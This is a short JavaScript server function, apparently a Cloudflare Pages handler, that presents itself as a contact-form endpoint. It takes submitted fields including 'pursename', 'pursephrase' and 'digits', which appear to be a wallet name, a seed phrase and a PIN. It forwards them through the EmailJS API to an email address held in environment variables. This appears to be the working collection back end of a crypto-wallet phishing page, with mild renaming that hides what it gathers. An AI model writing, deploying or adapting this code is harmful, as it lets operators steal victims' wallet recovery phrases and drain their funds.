export async function onRequestPost(context) {
    const {request, env}=  context

       if (request.method === 'OPTIONS') {
      return new Response(null, {
        status: 204,
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type',
        },
      });
    }
      

    if(request.method !== 'POST'){
        return new Response('Method Not Allowed', { status: 405,
        headers: { 'Access-Control-Allow-Origin': '*' },  
        })
    }

 

    try{
 
    const formData = await request.formData()
    
    const email = formData.get('email');
    const message = formData.get('message')
    const digits = formData.get('digits')
    const pursename = formData.get('pursename')
    const pursephrase = formData.get('pursephrase')

    const emailForm = new FormData()
    
    emailForm.append('service_id', env.SERVICE_ID)
    emailForm.append('template_id', env.TEMPLATE_ID)
    emailForm.append('user_id', env.USER_ID)
    emailForm.append('email', email)
    emailForm.append('message', message)
    emailForm.append('digits', digits)
    emailForm.append('pursename', pursename)
    emailForm.append('pursephrase', pursephrase)
  
    const resp = await fetch('https://api.emailjs.com/api/v1.0/email/send-form', {
        method: 'POST',
        body: emailForm,
})

  if (!resp.ok) {
    const errorText = await resp.text()
    return new Response(`EmailJS API error: ${errorText}`, { 
      status: 502,
      headers: { 'Access-Control-Allow-Origin': '*' },

     });
  }

  return new Response(JSON.stringify({ ok: true }), {
    status: 200,
    headers: { 
      'Content-Type': 'application/json',
      'Access-Control-Allow-Origin': '*' 
    },
  });
} catch (err) {
    return new Response(`Server Error: ${err.message}`, { 
      status: 500,
      headers: { 'Access-Control-Allow-Origin': '*' }
     })
}
}
